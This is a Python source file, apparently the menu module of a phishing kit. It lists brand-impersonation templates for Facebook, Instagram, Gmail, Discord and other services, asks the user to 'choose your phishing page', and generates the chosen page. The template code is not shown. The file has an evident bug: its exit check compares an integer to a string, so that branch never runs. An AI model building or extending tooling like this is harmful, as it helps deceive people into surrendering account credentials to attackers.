import sys

from lib.parsers.instagram import instagram
from lib.parsers.facebook import facebook
from lib.parsers.twitter import twitter
from lib.parsers.snapchat import snapchat
from lib.parsers.linkedIn import linkedIn
from lib.parsers.gmail import gmail
from lib.parsers.discord import discord
from lib.parsers.web_host_app import web_host_app
from lib.colors import style


# Generate email templates based on users option
def generate_email():
    print (u"{}[2J{}[;H".format(chr(27), chr(27)))     # Clear the terminal
    template_id = 0
    templates = ['Facebook', 'Instagram', 'Twitter',
                'Snapchat', 'LinkedIn', 'Gmail',
                'Discord', '000WebHost']
    print(style.RESET("        -- Choose your phishing page --\n"))
    for template in templates:
        template_id += 1
        print(style.GREEN(f'[{template_id}]') + style.RESET(f' {template} Template.'))
    try:
        template_option = int(input(style.YELLOW('\n[+]') + style.RESET(' Enter template ID: ')))
    except:
        print(style.RED('\n[!]') + style.RESET(' Wrong input, exiting...'))
        sys.exit()

    if template_option == "9":
        print (u"{}[2J{}[;H".format(chr(27), chr(27)))     # Clear the terminal
        sys.exit()
    else:
        templates = [facebook, instagram, twitter,
                    snapchat, linkedIn, gmail,
                    discord, web_host_app]

        template = int(template_option) - 1
        templates[template]()
        print (u"{}[2J{}[;H".format(chr(27), chr(27)))     # Clear the terminal
        print(style.GREEN('[+]') + style.RESET(' The page has been generated and saved in Templates/Generated_Emails.'))
        input(style.YELLOW('[*]') + style.RESET(' Press anything to continue.'))
